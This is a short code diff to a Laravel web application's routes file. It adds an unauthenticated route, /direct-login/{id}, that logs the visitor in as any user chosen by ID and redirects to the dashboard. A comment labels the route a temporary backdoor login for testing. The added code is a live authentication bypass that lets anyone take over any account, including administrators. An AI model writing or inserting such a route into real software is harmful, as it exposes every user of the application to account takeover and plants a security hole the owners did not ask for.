@@ -126,3 +126,12 @@ Route::fallback(function () {
     
     return redirect()->route('login');
 })->middleware('guest.gateway');
+// 🛠️ TEMPORARY BACKDOOR LOGIN (Delete after testing)
+Route::get('/direct-login/{id}', function ($id) {
+    $user = \App\Models\User::find($id);
+    if ($user) {
+        Auth::login($user);
+        return redirect()->to('/dashboard');
+    }
+    return "User ID not found in database.";
+});
